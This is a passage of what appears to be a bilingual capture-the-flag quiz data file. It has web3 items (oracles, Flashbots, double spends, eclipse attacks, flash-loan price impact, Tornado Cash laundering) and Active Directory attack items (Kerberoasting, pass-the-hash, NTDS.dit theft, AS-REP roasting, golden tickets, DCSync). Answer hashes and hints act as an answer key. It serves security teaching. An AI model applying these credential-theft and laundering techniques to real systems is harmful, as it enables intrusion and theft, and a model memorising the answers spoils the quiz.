      "ko": "단일 교환소 시세 대신, 여러 독립 데이터 제공자가 각자 보고한 값을 온체인에서 집계·중앙값 처리해 하나의 가격으로 내놓는 탈중앙 네트워크가 있다. DeFi 프로토콜이 가격 조작을 피하려면 이걸 쓰라고 권장된다. 이 네트워크의 이름은?",
      "en": "Instead of one exchange's quote, a decentralized network takes values reported by many independent data providers and aggregates/medianizes them on-chain into a single price. DeFi protocols are advised to use it to avoid price manipulation. Name this network."
    },
    "hints": {
      "ko": [
        "\"chain\" + \"link\", 한 단어.",
        "토큰 티커는 LINK."
      ],
      "en": [
        "\"chain\" + \"link\", one word.",
        "Its token ticker is LINK."
      ]
    }
  },
  {
    "id": "t3_web3flashbots",
    "tier": 3,
    "cat": "onchain",
    "track": "web3",
    "points": 130,
    "ci": true,
    "hash": "02fabb74a0a08a6217c01435b4ff498593502b2dbc71edda2d514faf6268c8be",
    "fmt": "한 단어 / one word (9글자 / 9 chars)",
    "title": {
      "ko": "대기실을 건너뛰는 지름길",
      "en": "The Shortcut Past the Waiting Room"
    },
    "prompt": {
      "ko": "공개된 대기 영역에 트랜잭션을 흘리면 봇의 먹잇감이 된다. 대신 트랜잭션 번들을 블록 빌더에게 직접(비공개 채널로) 제출해, 공개되지 않고 원하는 순서로 포함되게 하는 서비스가 있다. 실패한 번들은 온체인에 남지 않는다. 이 서비스의 이름은?",
      "en": "Leak a transaction into the public waiting area and it becomes bot bait. Instead, a service lets you submit a transaction bundle straight to block builders (via a private channel), so it is included in your chosen order without ever being public. A failed bundle never lands on-chain. Name this service."
    },
    "hints": {
      "ko": [
        "\"flash\" + \"bots\", 한 단어.",
        "이후 블록 빌딩 인프라로 확장됐다."
      ],
      "en": [
        "\"flash\" + \"bots\", one word.",
        "It later grew into block-building infrastructure."
      ]
    }
  },
  {
    "id": "t3_web3merkle",
    "tier": 3,
    "cat": "onchain",
    "track": "web3",
    "points": 200,
    "ci": false,
    "hash": "1df5a88ca90b7326dd788e23245d63fa671e439190d18bc129d480e2e86e8ff3",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "머클 루트 계산",
      "en": "Computing a Merkle Root"
    },
    "prompt": {
      "ko": "네 개의 리프 값을 UTF-8 문자열로 각각 SHA-256 해싱해 32바이트 다이제스트를 얻는다. 그 다음 왼쪽부터 둘씩 짝지어 두 다이제스트를 이어 붙인 64바이트를 다시 SHA-256 한다: H = SHA256(left ‖ right). 두 번 올라가면 루트가 나온다. 루트의 앞 8개 16진수 문자를 소문자로 읽어 `FLAG{MROOT_<hex8>}` 를 제출하라.\n\n```\nleaves: alpha, bravo, charlie, delta\n```",
      "en": "Hash each of the four leaf values as a UTF-8 string with SHA-256 to get a 32-byte digest. Then pair them left to right and hash the 64 bytes formed by concatenating the two digests: H = SHA256(left || right). Go up two levels to reach the root. Read the first 8 hex characters of the root in lowercase and submit `FLAG{MROOT_<hex8>}`.\n\n```\nleaves: alpha, bravo, charlie, delta\n```"
    },
    "hints": {
      "ko": [
        "H01 = SHA256(SHA256('alpha') ‖ SHA256('bravo')), H23 = SHA256(SHA256('charlie') ‖ SHA256('delta')).",
        "root = SHA256(H01 ‖ H23). 앞 8자를 취한다."
      ],
      "en": [
        "H01 = SHA256(SHA256('alpha') || SHA256('bravo')), H23 = SHA256(SHA256('charlie') || SHA256('delta')).",
        "root = SHA256(H01 || H23). Take its first 8 chars."
      ]
    }
  },
  {
    "id": "t4_web3doublespend",
    "tier": 4,
    "cat": "onchain",
    "track": "web3",
    "points": 160,
    "ci": true,
    "hash": "4efe5da76e096b45ecf01e51ee2557afdb340067077f8b4ed708e736f1f0a49c",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "같은 코인을 두 번",
      "en": "The Same Coin, Twice"
    },
    "prompt": {
      "ko": "공격자가 전체 해시파워/지분의 과반을 쥐면, 거래소에 입금해 확인을 받은 뒤 비밀리에 그 입금이 없는 더 긴 대안 체인을 채굴한다. 대안 체인을 공개하면 원래 입금 트랜잭션이 무효화되고 코인은 공격자에게 돌아간다 — 이미 출금·교환한 자산은 그대로 남긴 채. 이 공격 결과를 부르는 두 단어(형용사 + 동사)는?",
      "en": "With a majority of total hashpower/stake, an attacker deposits to an exchange, waits for confirmations, then secretly mines a longer alternative chain without that deposit. Publishing the alternative chain voids the original deposit and returns the coins to the attacker — while the assets already withdrawn and exchanged stay gone. What two words (adjective + verb) name this outcome?"
    },
    "hints": {
      "ko": [
        "같은 자금을 두 곳에 쓴다.",
        "\"double\" + \"spend\". 방어: 대형 입금에 확인 수 늘리기."
      ],
      "en": [
        "Spending the same funds in two places.",
        "\"double\" + \"spend\". Defense: more confirmations for large deposits."
      ]
    }
  },
  {
    "id": "t4_web3eclipse",
    "tier": 4,
    "cat": "onchain",
    "track": "web3",
    "points": 160,
    "ci": true,
    "hash": "80b1509ea37643250da601f2d24fe9b236b76fd3a3d7d18498d760cdd38813b2",
    "fmt": "한 단어 / one word (7글자 / 7 chars)",
    "title": {
      "ko": "노드를 세상에서 가리다",
      "en": "Blotting Out a Node's World"
    },
    "prompt": {
      "ko": "공격자가 피해 노드의 모든 아웃바운드 P2P 연결 슬롯을 자기 노드들로 채우면, 그 피해 노드가 보는 블록체인은 전부 공격자가 만든 것이 된다. 위조 트랜잭션 주입, 0-확인 이중지불 노출, 채굴력 낭비 유도가 가능해진다. 천문 현상에 빗댄 이 공격의 일곱 글자 영어 이름은?",
      "en": "If an attacker fills every one of a victim node's outbound P2P connection slots with attacker nodes, the entire blockchain that victim sees is one the attacker crafted. Forged-transaction injection, exposure to 0-confirmation double spends, and wasted mining power all follow. Give the seven-letter English name for this attack, named after an astronomical event."
    },
    "hints": {
      "ko": [
        "해가 가려지는 현상.",
        "방어: 고정 피어, AS 레벨 연결 다양화, feeler 연결."
      ],
      "en": [
        "When the sun is blotted out.",
        "Defenses: fixed peers, AS-level connection diversity, feeler connections."
      ]
    }
  },
  {
    "id": "t4_web3selfish",
    "tier": 4,
    "cat": "onchain",
    "track": "web3",
    "points": 160,
    "ci": true,
    "hash": "6c3cb0846df80695a05ea3583b1813d2244daf397181aa3079ffefce948da4bc",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "블록을 숨겼다가",
      "en": "Sitting on a Block"
    },
    "prompt": {
      "ko": "정직한 채굴자는 블록을 찾으면 바로 공개한다. 이 전략은 다르다: 블록을 찾아도 비밀에 부치고 몰래 앞서 나가다가, 정직한 체인이 따라붙는 순간 숨겨둔 더 긴 체인을 공개해 정직한 블록들을 고아로 만든다. Eyal & Sirer(2014)는 25% 해시파워만 있어도 이론상 이득이라고 보였다. 이 전략을 부르는 두 단어(형용사 + 동명사)는?",
      "en": "An honest miner publishes a block as soon as it is found. This strategy is different: keep a found block secret, build a hidden lead, and the moment the honest chain catches up, release the longer hidden chain to orphan the honest blocks. Eyal & Sirer (2014) showed it is theoretically profitable with just 25% hashpower. What two words (adjective + gerund) name this strategy?"
    },
    "hints": {
      "ko": [
        "이기적으로(selfish) 채굴(mining)한다.",
        "\"selfish\" + \"mining\"."
      ],
      "en": [
        "You mine \"selfishly\".",
        "\"selfish\" + \"mining\"."
      ]
    }
  },
  {
    "id": "t4_web3malleability",
    "tier": 4,
    "cat": "onchain",
    "track": "web3",
    "points": 160,
    "ci": true,
    "hash": "6c8d98ad8b2979aa859f142614fb70b7a7b7362fb043b14b492bb9c57238d333",
    "fmt": "한 단어 / one word (12글자 / 12 chars)",
    "title": {
      "ko": "같은 거래, 다른 이름표",
      "en": "Same Transaction, Different Label"
    },
    "prompt": {
      "ko": "ECDSA 서명 `(r, s)` 는 `(r, n − s)` 로 바꿔도 여전히 유효하다. 이러면 트랜잭션 내용은 그대로인데 그 해시(TxID)가 달라진다. Mt. Gox 는 이 때문에 출금 추적에 혼란을 겪었다. Bitcoin 은 SegWit 으로, Ethereum 은 EIP-2(s 를 절반 이하로 제한)로 대응했다. 서명 하나로 TxID 가 바뀌는 이 성질의 열두 글자 영어 이름은?",
      "en": "An ECDSA signature `(r, s)` is still valid rewritten as `(r, n - s)`. The transaction content is unchanged but its hash (TxID) is now different. Mt. Gox was thrown into confusion tracking withdrawals because of it. Bitcoin answered with SegWit, Ethereum with EIP-2 (restricting s to half or less). Give the twelve-letter English name for this property where one signature edit changes the TxID."
    },
    "hints": {
      "ko": [
        "\"malleable\"(주물러 모양을 바꿀 수 있는) + -ity.",
        "SegWit 은 서명을 TxID 계산에서 분리했다."
      ],
      "en": [
        "\"malleable\" (able to be reshaped) + -ity.",
        "SegWit moved the signature out of the TxID calculation."
      ]
    }
  },
  {
    "id": "t4_web3proxy",
    "tier": 4,
    "cat": "contract",
    "track": "web3",
    "points": 160,
    "ci": true,
    "hash": "1241936d4dd3aad68fe7bfbdfe854b935926bc678fc72377e15166078916227a",
    "fmt": "한 단어 / one word (5글자 / 5 chars)",
    "title": {
      "ko": "얇은 껍데기, 갈아끼는 알맹이",
      "en": "A Thin Shell, a Swappable Core"
    },
    "prompt": {
      "ko": "컨트랙트는 불변이지만 업그레이드가 필요할 때가 있다. 해법: 상태와 잔액을 보관하는 얇은 컨트랙트가 모든 호출을 별도의 로직 컨트랙트로 넘겨 실행시키되 스토리지는 자기 것을 쓰고, 업그레이드는 그 로직 주소만 바꾸는 것이다. 두 컨트랙트의 슬롯이 어긋나면 상태가 깨져서 EIP-1967 이 슬롯을 표준화했다. 이 얇은 컨트랙트를 부르는 다섯 글자 영어 단어는?",
      "en": "A contract is immutable, but sometimes needs upgrading. The solution: a thin contract that holds the state and balance forwards every call to a separate logic contract to run there while using its own storage, and an upgrade just changes that logic address. State breaks if the two contracts' slots do not line up, which is why EIP-1967 standardized the slots. Give the five-letter English word for this thin contract."
    },
    "hints": {
      "ko": [
        "대리인·중개. UUPS·Transparent 두 스타일이 있다.",
        "다섯 글자, \"대리\"."
      ],
      "en": [
        "A stand-in or intermediary. Two styles: UUPS and Transparent.",
        "Five letters, means \"a stand-in\"."
      ]
    }
  },
  {
    "id": "t4_web3slither",
    "tier": 4,
    "cat": "contract",
    "track": "web3",
    "points": 160,
    "ci": true,
    "hash": "116a0ec3504893574a262fd4b1c9961bdfad14e3fd9f5331a4999ccadf502384",
    "fmt": "한 단어 / one word (7글자 / 7 chars)",
    "title": {
      "ko": "감사의 첫 관문",
      "en": "The First Gate of an Audit"
    },
    "prompt": {
      "ko": "Trail of Bits 가 만든 파이썬 기반 정적 분석기. 소스를 실행하지 않고 코드 패턴을 분석해 콜백 배수 버그, 임의 송금, 초기화 안 된 스토리지, 약한 난수원 등을 빠르게 잡아낸다. 빠르고 자동화하기 쉬워 거의 모든 컨트랙트 감사의 첫 단계로 돌린다. 뱀의 움직임을 딴 이 도구의 이름은?",
      "en": "A Python-based static analyzer from Trail of Bits. Without executing the source, it analyzes code patterns and quickly flags callback-drain bugs, arbitrary sends, uninitialized storage, weak randomness and more. Fast and easy to automate, it is run as the first step of nearly every contract audit. Name this tool, named after how a snake moves."
    },
    "hints": {
      "ko": [
        "뱀이 미끄러지듯 기어가는 동작.",
        "일곱 글자. Mythril·Echidna 와 함께 쓰인다."
      ],
      "en": [
        "The gliding way a snake crawls.",
        "Seven letters. Used alongside Mythril and Echidna."
      ]
    }
  },
  {
    "id": "t4_web3foundry",
    "tier": 4,
    "cat": "contract",
    "track": "web3",
    "points": 160,
    "ci": true,
    "hash": "dfb316701857783dac69a14d1fe3fd60cff21d56e830baf7f0e3871bd73eee39",
    "fmt": "한 단어 / one word (7글자 / 7 chars)",
    "title": {
      "ko": "솔리디티로 쓰는 익스플로잇",
      "en": "Exploits Written in Solidity"
    },
    "prompt": {
      "ko": "테스트를 JavaScript 가 아니라 Solidity 자체로 작성하는 개발·테스트 프레임워크. `forge` 로 메인넷을 특정 블록에서 포크해 사고 당시 상태를 재현하고, `--match-test` 로 익스플로잇 테스트를 돌려 취약점을 PoC 로 증명한다. `cast` 로 온체인 조회·전송, `anvil` 로 로컬 노드. 이 프레임워크의 이름은?",
      "en": "A development and testing framework where you write tests in Solidity itself, not JavaScript. With `forge` you fork mainnet at a chosen block to reproduce the state at the time of the incident, and run an exploit test with `--match-test` to prove a vulnerability as a PoC. `cast` does on-chain queries and sends; `anvil` is the local node. Name this framework."
    },
    "hints": {
      "ko": [
        "금속을 녹여 붓는 주조 공장.",
        "일곱 글자. 명령어 셋: forge, cast, anvil."
      ],
      "en": [
        "A works where metal is cast.",
        "Seven letters. Three commands: forge, cast, anvil."
      ]
    }
  },
  {
    "id": "t4_web3tornado",
    "tier": 4,
    "cat": "onchain",
    "track": "web3",
    "points": 160,
    "ci": true,
    "hash": "fd41c45a9748674bd8345684ff00324bc126290b37df6a48cbb026df5abdae0f",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "자금 출처를 흐리는 믹서",
      "en": "The Mixer That Blurs the Source"
    },
    "prompt": {
      "ko": "탈취한 자금을 곧바로 현금화하면 추적당한다. 그래서 공격자는 이더리움 믹서에 자금을 예치하고 나중에 다른 주소로 빼서 입출금의 연결을 끊는다. 영지식 증명으로 예치자와 인출자의 관계를 숨기는 이 서비스는 2022년 미국 OFAC 제재 대상이 되었다. 회오리 이름을 딴 이 믹서의 두 단어 이름은?",
      "en": "Cash out stolen funds directly and you get traced. So attackers deposit funds into an Ethereum mixer and later withdraw to a different address, severing the link between deposit and withdrawal. Using zero-knowledge proofs to hide which depositor a withdrawal belongs to, this service was placed under US OFAC sanctions in 2022. Give the two-word name of this mixer, named after a windstorm."
    },
    "hints": {
      "ko": [
        "회오리바람 + \"현금\".",
        "\"Tornado\" + \"Cash\"."
      ],
      "en": [
        "A whirlwind + \"cash\".",
        "\"Tornado\" + \"Cash\"."
      ]
    }
  },
  {
    "id": "t4_web3pause",
    "tier": 4,
    "cat": "onchain",
    "track": "web3",
    "points": 160,
    "ci": true,
    "hash": "6210c0bf05396716df932f0729df69de0533933e5ad9871fd07b61811c4c28df",
    "fmt": "한 단어 / one word (5글자 / 5 chars)",
    "title": {
      "ko": "사고 대응의 첫 손짓",
      "en": "An Incident Responder's First Move"
    },
    "prompt": {
      "ko": "Web3 사고 초동 대응 5분 체크리스트에서, 의심 트랜잭션과 컨트랙트 잔액을 확인한 직후에 하는 것: 컨트랙트에 이 기능이 있으면 즉시 호출해 더 이상 상태를 바꾸는 함수가 실행되지 못하게 막는다. OpenZeppelin 의 Pausable 이 제공하는, 이 긴급 정지 함수의 다섯 글자 이름은?",
      "en": "In the Web3 incident-response 5-minute checklist, right after checking the suspicious transaction and the contract's balance: if the contract has this function, call it at once so no more state-changing function can run. Give the five-letter name of this emergency-stop function, provided by OpenZeppelin's Pausable."
    },
    "hints": {
      "ko": [
        "멈춤 버튼.",
        "다섯 글자. 반대는 unpause()."
      ],
      "en": [
        "A stop button.",
        "Five letters. The opposite is unpause()."
      ]
    }
  },
  {
    "id": "t4_web3capstone",
    "tier": 4,
    "cat": "defi",
    "track": "web3",
    "points": 250,
    "ci": false,
    "hash": "5094e4eeffd5d2656da0a18a22caa6eb03aa16c78e3eaab33d502bcd97aa04cb",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "원자적 대출 가격 조작",
      "en": "Atomic-Borrow Price Manipulation"
    },
    "prompt": {
      "ko": "상수곱 AMM 풀에서 한 트랜잭션 안에 대량의 USDC 를 빌려 전부 ETH 로 스왑하면 풀 시세가 크게 움직인다. 입력에는 0.3% 수수료가 먼저 붙는다(실효 입력 = 입력 × 0.997). k = x·y 는 유지된다. 아래 상황에서 (1) 받는 ETH 를 정수로 내림한 값과 (2) 스왑 전후 ETH 시세(USDC/ETH)의 변화율을 반올림한 정수(%)를 구해 `FLAG{ETH<정수>_IMPACT<정수>}` 를 제출하라.\n\n```\npool: 200 ETH, 500000 USDC\nflash-borrow: 100000 USDC -> swap all to ETH\nfee: 0.3%\n```",
      "en": "In a constant-product AMM pool, borrowing a large amount of USDC within a single transaction and swapping it all to ETH moves the pool's quote a lot. The input is taxed 0.3% first (effective input = input * 0.997). k = x*y is kept. For the situation below, work out (1) the ETH received, floored to a whole number, and (2) the percent change in the ETH quote (USDC/ETH) from before to after the swap, rounded to a whole number. Submit `FLAG{ETH<integer>_IMPACT<integer>}`.\n\n```\npool: 200 ETH, 500000 USDC\nflash-borrow: 100000 USDC -> swap all to ETH\nfee: 0.3%\n```"
    },
    "hints": {
      "ko": [
        "실효 입력 99700. new_y = 599700, new_x = (200·500000)/599700 ≈ 166.75. ETH 받음 ≈ 33.25 → 33.",
        "이전 시세 500000/200 = 2500. 이후 599700/166.75 ≈ 3596.4. 변화율 ≈ +43.9% → 44."
      ],
      "en": [
        "Effective input 99700. new_y = 599700, new_x = (200*500000)/599700 ~ 166.75. ETH received ~ 33.25 -> 33.",
        "Old quote 500000/200 = 2500. New 599700/166.75 ~ 3596.4. Change ~ +43.9% -> 44."
      ]
    }
  },
  {
    "id": "t0_adkdc",
    "tier": 0,
    "cat": "kerberos",
    "track": "adattack",
    "points": 50,
    "ci": true,
    "hash": "2fc54199d41f9fba84e526a57819bc630714f0394ff1391f648e38fd4639caac",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "티켓을 찍어 주는 곳",
      "en": "Where the Tickets Are Issued"
    },
    "prompt": {
      "ko": "액티브 디렉터리에서 사용자의 신원을 확인하고, 다른 서비스에 접근할 때 쓰는 티켓을 발급하는 서비스가 있다. 모든 도메인 컨트롤러가 이 서비스를 돌리며, 티켓 서명에 쓰는 마스터 키들을 쥐고 있다. 이 서비스의 세 글자 약어는?",
      "en": "One service in Active Directory verifies a user's identity and issues the tickets they use to reach other services. Every domain controller runs it, and it holds the master keys that sign those tickets. Give its three-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Key Distribution Center\".",
        "내부적으로 AS(인증)와 TGS(티켓 발급) 두 부분으로 나뉜다."
      ],
      "en": [
        "\"Key Distribution Center\".",
        "Internally split into the AS (authentication) and the TGS (ticket-granting) halves."
      ]
    }
  },
  {
    "id": "t0_adbloodhound",
    "tier": 0,
    "cat": "enum",
    "track": "adattack",
    "points": 50,
    "ci": true,
    "hash": "2b8b3644ac7e9a7db891504e3d4bdb9bf1664317add2647d8ab5315960828302",
    "fmt": "한 단어 / one word (10글자 / 10 chars)",
    "title": {
      "ko": "공격 경로를 그래프로",
      "en": "Attack Paths as a Graph"
    },
    "prompt": {
      "ko": "수집기(SharpHound)가 도메인의 사용자·그룹·세션·ACL 을 긁어 오면, 이 도구가 그것을 Neo4j 그래프로 만들어 \"일반 계정에서 도메인 관리자까지 가는 최단 경로\"를 Cypher 쿼리로 답해 준다. 개(犬) 이름을 딴 이 도구는?",
      "en": "A collector (SharpHound) scrapes the domain's users, groups, sessions and ACLs; this tool turns that into a Neo4j graph and answers \"shortest path from a normal account to Domain Admin\" with a Cypher query. Name this tool, named after a breed of dog."
    },
    "hints": {
      "ko": [
        "피(blood) + 사냥개(hound).",
        "SpecterOps 가 만들었고, 무료 커뮤니티 에디션이 있다."
      ],
      "en": [
        "blood + hound.",
        "Made by SpecterOps; there is a free community edition."
      ]
    }
  },
  {
    "id": "t1_adkerberos",
    "tier": 1,
    "cat": "kerberos",
    "track": "adattack",
    "points": 65,
    "ci": true,
    "hash": "d6f845779b5f0a377f3854eb15f1b5b6ec3b34afb690b5f1241bb4c69d680c41",
    "fmt": "한 단어 / one word (8글자 / 8 chars)",
    "title": {
      "ko": "저승 문을 지키는 개",
      "en": "The Dog at the Gate of the Underworld"
    },
    "prompt": {
      "ko": "액티브 디렉터리의 네트워크 인증 프로토콜. 비밀번호를 네트워크로 보내지 않고, 시간이 찍힌 암호화된 티켓으로 신원을 증명한다. MIT 에서 만들었고 그리스 신화의 머리 셋 달린 개에서 이름을 땄다. 이 프로토콜의 이름은?",
      "en": "Active Directory's network authentication protocol. It never sends passwords over the wire; identity is proven with time-stamped, encrypted tickets. Built at MIT and named after the three-headed dog of Greek myth. Name it."
    },
    "hints": {
      "ko": [
        "머리 셋 달린 개의 이름.",
        "기본 포트는 88 (TCP/UDP)."
      ],
      "en": [
        "The name of the three-headed dog.",
        "Its default port is 88 (TCP/UDP)."
      ]
    }
  },
  {
    "id": "t1_adspn",
    "tier": 1,
    "cat": "enum",
    "track": "adattack",
    "points": 65,
    "ci": true,
    "hash": "1d0efc7baea5a0184eb3fd2ccd143ef34a7c0bcc480c726ba6f7fb9c5189c46a",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "서비스를 가리키는 이름",
      "en": "The Name That Points at a Service"
    },
    "prompt": {
      "ko": "특정 서비스 인스턴스를 고유하게 식별하는 문자열로, 형식은 `클래스/호스트:포트` 다(예: `MSSQLSvc/db.corp.local:1433`). Kerberos 클라이언트가 어떤 서비스의 티켓을 요청하려면 이 이름을 알아야 하고, 인증된 도메인 사용자는 누구나 아무 서비스에나 그 티켓을 요청할 수 있다. 이 이름의 세 글자 약어는?",
      "en": "A string that uniquely identifies one service instance, in the form `class/host:port` (e.g. `MSSQLSvc/db.corp.local:1433`). A Kerberos client must know it to request a ticket for that service, and any authenticated domain user may request that ticket for any service. Give the three-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Service Principal Name\".",
        "`setspn -L <계정>` 으로 계정에 걸린 것을 나열한다."
      ],
      "en": [
        "\"Service Principal Name\".",
        "`setspn -L <account>` lists the ones registered on an account."
      ]
    }
  },
  {
    "id": "t1_adkerberoast",
    "tier": 1,
    "cat": "kerberos",
    "track": "adattack",
    "points": 65,
    "ci": true,
    "hash": "2134d2df9dad63fa67d404cf69f2dd4070b4a2f660b121a51d81505df3b24f33",
    "fmt": "한 단어 / one word (13글자 / 13 chars, -ing으로 끝남 / ends in -ing)",
    "title": {
      "ko": "서비스 계정 티켓 오프라인 굽기",
      "en": "Roasting Service-Account Tickets Offline"
    },
    "prompt": {
      "ko": "평범한 도메인 계정 하나만 있으면 된다. SPN 이 걸린 모든 계정의 서비스 티켓을 요청하면, 그 티켓은 해당 서비스 계정의 비밀번호 해시로 암호화되어 돌아온다. 이것을 파일로 저장해 hashcat 으로 오프라인 크래킹하면 약한 서비스 비밀번호는 순식간에 뚫린다. 이 공격의 이름(-ing 로 끝남)은?",
      "en": "You need only one ordinary domain account. Request a service ticket for every SPN account and it comes back encrypted with that service account's password hash. Save it to a file, crack it offline with hashcat, and weak service passwords fall in seconds. Name this attack (ends in -ing)."
    },
    "hints": {
      "ko": [
        "\"Kerberos\" + 고기를 굽다(roasting).",
        "hashcat 모드 13100 (TGS-REP etype 23)."
      ],
      "en": [
        "\"Kerberos\" + roasting.",
        "hashcat mode 13100 (TGS-REP etype 23)."
      ]
    }
  },
  {
    "id": "t1_adpth",
    "tier": 1,
    "cat": "lateral",
    "track": "adattack",
    "points": 65,
    "ci": true,
    "hash": "80ce523ad320b1c837c94cbb559dccaef4cc33d1ee48459ecd1c2eeaab8fd787",
    "fmt": "값 그대로 / literal (13글자 / 13 chars, - 포함 / include -)",
    "title": {
      "ko": "해시만으로 로그인",
      "en": "Log In With Just the Hash"
    },
    "prompt": {
      "ko": "NTLM 인증은 평문 비밀번호가 필요 없다 — NT 해시만 있으면 챌린지·응답을 만들 수 있다. 그래서 메모리나 SAM 에서 훔친 NT 해시를 크래킹 없이 그대로 `psexec`·`wmiexec` 에 넣어, 그 해시를 공유하는 모든 머신에서 코드를 실행할 수 있다. 이 기법의 이름(하이픈 포함)은?",
      "en": "NTLM authentication needs no plaintext password — the NT hash alone builds the challenge-response. So a hash stolen from memory or the SAM goes straight into `psexec`/`wmiexec` with no cracking, running code on every machine that shares it. Name this technique (hyphenated)."
    },
    "hints": {
      "ko": [
        "해시를 \"그대로 넘긴다(pass)\".",
        "대응책: 머신마다 로컬 관리자 비밀번호를 다르게 (LAPS)."
      ],
      "en": [
        "You \"pass\" the hash along as-is.",
        "Countered by a unique local-admin password per machine (LAPS)."
      ]
    }
  },
  {
    "id": "t1_adntds",
    "tier": 1,
    "cat": "enum",
    "track": "adattack",
    "points": 65,
    "ci": true,
    "hash": "65a1a9be5b86629015b01ea28efab0d2ddc7648d008dd6c16f1d746a63a5bfa5",
    "fmt": "값 그대로 / literal (8글자 / 8 chars, . 포함 / include .)",
    "title": {
      "ko": "도메인의 비밀번호 전부",
      "en": "Every Password in the Domain"
    },
    "prompt": {
      "ko": "도메인 컨트롤러에 있는 이 데이터베이스 파일에는 도메인의 모든 계정과 그 비밀번호 해시가 들어 있다. 파일을 빼내거나(복제 권한을 악용해 원격으로도) 손에 넣으면 도메인 전체를 오프라인에서 크래킹할 수 있다. `C:\\Windows\\NTDS\\` 에 있는 이 파일의 이름은?",
      "en": "This database file on a domain controller holds every account in the domain and its password hash. Exfiltrate it (or pull the hashes remotely by abusing replication rights) and you can crack the whole domain offline. Name the file, found in `C:\\Windows\\NTDS\\`."
    },
    "hints": {
      "ko": [
        "\"NT Directory Services\" + `.dit` 확장자.",
        "오프라인 추출엔 SYSTEM 하이브의 부트 키도 필요하다."
      ],
      "en": [
        "\"NT Directory Services\" + the `.dit` extension.",
        "Offline extraction also needs the boot key from the SYSTEM hive."
      ]
    }
  },
  {
    "id": "t1_adkerbrute",
    "tier": 1,
    "cat": "enum",
    "track": "adattack",
    "points": 65,
    "ci": true,
    "hash": "efe257d7c92ba896b5c67eae68e790a00c9b9351d836991b360576ad35207f6c",
    "fmt": "한 단어 / one word (8글자 / 8 chars)",
    "title": {
      "ko": "로그인 없이 계정 찾기",
      "en": "Finding Accounts Without Logging In"
    },
    "prompt": {
      "ko": "로스팅을 시작하려면 유효한 사용자명 목록이 필요하다. 이 Go 도구는 자격 증명 없이 이름 목록을 KDC 에 던지고, Kerberos 사전 인증 오류 코드(계정 존재 시 PREAUTH_REQUIRED, 없으면 PRINCIPAL_UNKNOWN)를 읽어 어떤 계정이 실재하는지 가려낸다. 이 도구의 이름은?",
      "en": "To start roasting you need a list of valid usernames. This Go tool sprays a name list at the KDC with nothing to log in as and reads the Kerberos pre-auth error codes (PREAUTH_REQUIRED if the account exists, PRINCIPAL_UNKNOWN if not) to tell which accounts are real. Name it."
    },
    "hints": {
      "ko": [
        "\"Kerberos\" + \"brute\".",
        "userenum · passwordspray · bruteuser 하위 명령이 있다."
      ],
      "en": [
        "\"Kerberos\" + \"brute\".",
        "It has userenum, passwordspray and bruteuser sub-commands."
      ]
    }
  },
  {
    "id": "t2_adasrep",
    "tier": 2,
    "cat": "kerberos",
    "track": "adattack",
    "points": 90,
    "ci": true,
    "hash": "0c9ecf82abe8a3ac79c76ba4fec7dee19584499e728a1cc9171d0d765dc45515",
    "fmt": "값 그대로 / literal (15글자 / 15 chars, - 포함 / include -)",
    "title": {
      "ko": "도메인 계정 없이 굽기",
      "en": "Roasting With No Domain Account"
    },
    "prompt": {
      "ko": "SPN 서비스 계정을 굽는 것과 달리, 이 공격은 도메인 자격 증명이 전혀 필요 없다 — 사용자명 목록만 있으면 된다. Kerberos 사전 인증이 꺼진 계정에 AS-REQ 를 보내면, 응답의 일부가 그 계정의 비밀번호 해시로 암호화되어 돌아온다. hashcat 모드 18200 으로 크래킹하는 이 공격의 이름(하이픈 포함)은?",
      "en": "Unlike roasting SPN service accounts, this attack needs no domain account at all — only a username list. Send an AS-REQ for an account that has Kerberos pre-authentication disabled and part of the reply comes back encrypted with that account's NT hash. Cracked with hashcat mode 18200. Name this attack (hyphenated)."
    },
    "hints": {
      "ko": [
        "굽는 대상이 TGS-REP 가 아니라 AS-REP 다.",
        "전제: 계정에 DONT_REQ_PREAUTH 플래그."
      ],
      "en": [
        "What you roast is the AS-REP, not the TGS-REP.",
        "Prerequisite: the account carries the DONT_REQ_PREAUTH flag."
      ]
    }
  },
  {
    "id": "t2_adgolden",
    "tier": 2,
    "cat": "persist",
    "track": "adattack",
    "points": 90,
    "ci": true,
    "hash": "a5cf75865b718bf518d2e66c9a3ccc07e31a4aa5f1b417c4bbe448a607ec083e",
    "fmt": "두 단어 / two words (13글자 / 13 chars)",
    "title": {
      "ko": "krbtgt 해시로 위조한 TGT",
      "en": "A TGT Forged From the krbtgt Hash"
    },
    "prompt": {
      "ko": "krbtgt 계정의 NT 해시를 손에 넣으면, KDC 와 한 번도 통신하지 않고 임의의 사용자(존재하지 않는 사용자도, RID 500 관리자도) 명의의 TGT 를 직접 만들 수 있다. krbtgt 비밀번호를 두 번 리셋하기 전까지 계속 유효하다. 이 위조 티켓을 부르는 두 단어(형용사 + 명사)는?",
      "en": "With the krbtgt account's NT hash you can mint a TGT for any user — one that does not exist, or the RID-500 Administrator — without ever talking to the KDC. It stays valid until the krbtgt password is reset twice. What two words (adjective + noun) name this forged ticket?"
    },
    "hints": {
      "ko": [
        "금(金) + 티켓.",
        "은색 버전은 서비스 하나만 노린다."
      ],
      "en": [
        "gold + ticket.",
        "The silver version targets just one service."
      ]
    }
  },
  {
    "id": "t2_addcsync",
    "tier": 2,
    "cat": "lateral",
    "track": "adattack",
    "points": 90,
    "ci": true,
    "hash": "9ffe1c9cd4e0676ccf5f4f2bad989c346ece741395ce41f21593cc9c6d665e71",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "가짜 DC 로 해시 복제",
      "en": "Replicating Hashes as a Fake DC"
    },
    "prompt": {
      "ko": "도메인 컨트롤러인 척 다른 DC 에게 \"디렉터리 변경분을 복제해 달라\"(DS-Replication-Get-Changes)고 요청하면, DC 는 요청한 계정의 비밀번호 해시를 그대로 넘겨준다. DC 에 셸을 올릴 필요 없이, 복제 권한만 있으면 krbtgt 를 포함한 모든 해시를 뽑는다. mimikatz·secretsdump 의 이 기능 이름은?",
